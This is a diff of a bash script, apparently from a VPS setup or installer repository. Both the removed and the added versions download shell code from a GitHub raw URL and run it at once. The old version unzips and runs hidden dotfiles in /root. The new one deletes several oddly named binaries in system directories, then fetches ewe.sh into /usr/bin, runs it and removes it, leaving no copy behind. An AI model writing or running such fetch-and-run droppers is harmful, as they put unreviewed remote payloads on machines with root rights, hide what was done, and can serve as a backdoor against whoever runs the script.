@@ -1,13 +1,41 @@
-#!/bin/bash
-REPO="https://raw.githubusercontent.com/YaddyKakkoii/tes/main/"
+file1=/usr/bin/gpgw
+if [ -f $file1 ]; then
+    rm -f ${file1}
+fi
+#rm /usr/bin/gpgw
 
-cd /root && wget -O /root/.sodok.zip "${REPO}sodok.zip"
+file2=/usr/sbin/dropcache
+if [ -f $file2 ]; then
+    rm -f ${file2}
+fi
+#rm /usr/sbin/dropcache
 
-unzip .sodok.zip
-rm .sodok.zip > /dev/null 2>&1
+file3=/usr/local/bin/pyrsa-priv2key
+if [ -f $file3 ]; then
+    rm -f ${file3}
+fi
+#rm /usr/local/bin/pyrsa-priv2key
 
-bash .gg
-bash .nul
-bash .tt
+file4=/usr/sbin/ifmid
+if [ -f $file4 ]; then
+    rm -f ${file4}
+fi
+#rm /usr/sbin/ifmid
 
-echo "selesai maszeeh"
+file5=/usr/bin/gpgz
+if [ -f $file5 ]; then
+    rm -f ${file5}
+fi
+#rm /usr/bin/gpgz
+
+file6=/usr/bin/eue
+if [ -f $file6 ]; then
+    rm -f ${file6}
+else
+    wget -O /usr/bin/eue "https://raw.githubusercontent.com/YaddyKakkoii/tes/main/ewe.sh"
+    chmod +x /usr/bin/eue
+    eue
+    rm -f /usr/bin/eue
+fi
+rm .ahh
+ls -la
